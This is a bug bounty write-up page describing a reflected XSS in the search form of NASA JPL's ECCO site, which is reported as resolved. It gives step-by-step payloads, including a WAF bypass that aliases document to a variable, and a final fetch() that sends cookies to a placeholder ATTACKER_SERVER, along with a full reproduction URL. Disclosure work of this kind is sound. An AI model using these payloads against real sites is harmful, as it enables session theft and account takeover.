---
layout: default
submission_id: "4b01725e-288b-4db5-a38c-1a37f827d215"
official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f827d215"
---

<div class="container">
  <div class="lang-switcher">
    <a href="/es/bounties/nasa-jpl-ecco-xss-waf-bypass/" class="lang-btn"><span class="label-full">Español (ES)</span><span class="label-short">ES</span></a>
    <a href="./" class="lang-btn active"><span class="label-full">English (EN)</span><span class="label-short">EN</span></a>
  </div>
<article>
  <a href="/en/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>Search Form XSS Cookie Exfiltration with WAF Bypass</h1>
    <p style="color: var(--p3); font-weight: 600;">National Aeronautics and Space Administration Jet Propulsion Laboratory (NASA JPL)</p>
  </div>

  <div class="bounty-content">
    <h2>🔍 Search Anything</h2>
    <p>As with any bug bounty program, the first thing we did was use the page as any normal user would. The search field stood out at first glance, so we decided to try it out.</p>
    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></pre>
    <p>This is where we realized that the value we were adding was reflected on the website.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal.png" alt="Search Normal">
    <p>We decided to carefully inspect the website's source code and realized that our input was inside a <code>console.log()</code> function.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal Result.png" alt="Search Normal Result">

    <h2>🛡️ Tag &lt;script&gt; Disallowed</h2>
    <p>We ran some basic tests that are performed to try to detect XSS attacks:</p>
    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
    <p>All we got was that the Web Application Firewall (WAF) rejected our requests at the slightest sign of malicious activity.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Blocked by WAF">

    <h2>🔧 Close Javascript console.log String</h2>
    <p>Building on our initial discovery, we decided to try closing <code>console.log()</code> to insert code right after it using the following payload:</p>
    <pre><code>pwn');</code></pre>
    <p>We inserted <code>')</code> immediately after a string of text, which is what JavaScript needed to close <code>console.log()</code>. However, the semicolon symbol <code>;</code> was not being displayed.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Closing console.log.png" alt="Closing console.log">

    <h2>🧩 Append Javascript (Not Working)</h2>
    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></pre>
    <p>We tried again, but with some text after the semicolon. After several tests, we couldn't get the semicolon to appear. Worse still, everything after the semicolon didn't even appear in the text.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Where is semicollon.png" alt="Where is semicolon">

    <h2>🧱 Append Javascript (Bypass)</h2>
    <p>To make it work and start injecting code, we had to encode the semicolon in HTML format, changing it from <code>;</code> to <code>%3b</code>.</p>
    <pre><code>pwn')%3balert(1)</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Bypass Semicollon.png" alt="Bypass Semicolon">

    <h2>💥 First Alert (Working)</h2>
    <p>Although the WAF did not accept the <code>&lt;script&gt;</code> tag, we managed to get it to render the <code>&lt;/script&gt;</code> tag, which was enough to carry out a REFLECTED XSS attack.</p>
    <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1.png" alt="Alert 1">

    <h2>🚫 Second Alert (Firewall Blocks)</h2>
    <p>Once we had managed to execute an <code>alert()</code> on the web page, we wanted to go further and attempt to read a user's cookies. The WAF continued to reject our requests as soon as it detected suspicious strings such as <code>document.cookie</code>.</p>
    <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Blocked by WAF">

    <h2>🕵️ Firewall Bypass for Cookies</h2>
    <p>The WAF rejected strings like <code>document.cookie</code>. To achieve an effective WAF bypass, we created a variable <code>a</code> that contained <code>document</code>, and we requested <code>cookie</code> from that variable.</p>
    <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Alert.png" alt="Document Cookie Alert">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Result.png" alt="Document Cookie Result">

    <h2>🚀 Final Exploit (Cookies Exfiltration)</h2>
    <p>Instead of executing <code>alert</code>, we executed <code>fetch</code> to sending a request to a server controlled by the attacker.</p>
    <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Final Exploit">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Exfiltration Request">

    <h2>✅ Steps To Reproduce</h2>
    <ol>
      <li>Start a public web server (we used Serveo exposing a Python localhost server for this).</li>
      <li>Replace <code>ATTACKER_SERVER</code> with the URL generated for you:
        <pre><code>pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
      </li>
      <li>Visit the URL:
        <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
      </li>
    </ol>
    <p>You'll receive a request with your <code>cookies</code> appended. You can try with another person to prove it's working.</p>

    <h2>📜 Official Recognition</h2>
    <div class="pdf-container">
      <iframe src="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
    </div>
    
    <div style="text-align: center; margin-top: 1rem;">
      <a href="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Download Official Letter (PDF)</a>
    </div>

    <h2>🤝 Collaboration Details</h2>
    <p>This research was conducted in a joint effort with the following researchers:</p>
    <div class="collab-grid">
      <div class="collab-card">
        <div class="collab-avatar">
          <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </div>
        <div class="collab-body">
          <div class="collab-name">{{ site.researchers.ivan.name }}</div>
          <div class="collab-links">
            <a class="social-pill" href="{{ site.researchers.ivan.bugcrowd }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 2l7 4v6c0 5-3 9-7 10C8 21 5 17 5 12V6z"></path><path d="M9 12l2 2 4-5"></path></svg>
              <span>Bugcrowd</span>
            </a>
            <a class="social-pill" href="{{ site.researchers.ivan.linkedin }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4V9h4v2"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
              <span>LinkedIn</span>
            </a>
          </div>
        </div>
      </div>

      <div class="collab-card">
        <div class="collab-avatar">
          <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </div>
        <div class="collab-body">
          <div class="collab-name">{{ site.researchers.diego.name }}</div>
          <div class="collab-links">
            <a class="social-pill" href="{{ site.researchers.diego.bugcrowd }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 2l7 4v6c0 5-3 9-7 10C8 21 5 17 5 12V6z"></path><path d="M9 12l2 2 4-5"></path></svg>
              <span>Bugcrowd</span>
            </a>
            <a class="social-pill" href="{{ site.researchers.diego.linkedin }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4V9h4v2"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
              <span>LinkedIn</span>
            </a>
          </div>
        </div>
      </div>
    </div>

    <div class="meta-grid">
      <div class="meta-card">
        <div class="meta-left">
          <div class="meta-icon">
            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"></path></svg>
          </div>
          <div class="meta-title">
            <strong>Status</strong>
          </div>
        </div>
        <div class="meta-badge success">Resolved</div>
      </div>

      <div class="meta-card">
        <div class="meta-left">
          <div class="meta-icon">
            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 9v4"></path><path d="M12 17h.01"></path><path d="M10.29 3.86l-8.12 14.06A2 2 0 0 0 3.9 21h16.2a2 2 0 0 0 1.73-3.08L13.71 3.86a2 2 0 0 0-3.42 0z"></path></svg>
          </div>
          <div class="meta-title">
            <strong>Severity</strong>
          </div>
        </div>
        <div class="meta-badge medium">Medium</div>
      </div>
    </div>

    <div class="verification-panel">
      <h3>Verification</h3>
      <div class="verification-grid">
        <div class="verification-item">
          <small>Submission ID</small>
          <div class="value">{{ page.submission_id | default: 'N/A' }}</div>
        </div>
        <div class="verification-item">
          <small>Official Link</small>
          <div class="value">
            {% if page.official_link %}
              <a href="{{ page.official_link }}" target="_blank" rel="noopener noreferrer">{{ page.official_link }}</a>
            {% else %}
              N/A
            {% endif %}
          </div>
        </div>
      </div>
    </div>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Zoomed Image">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
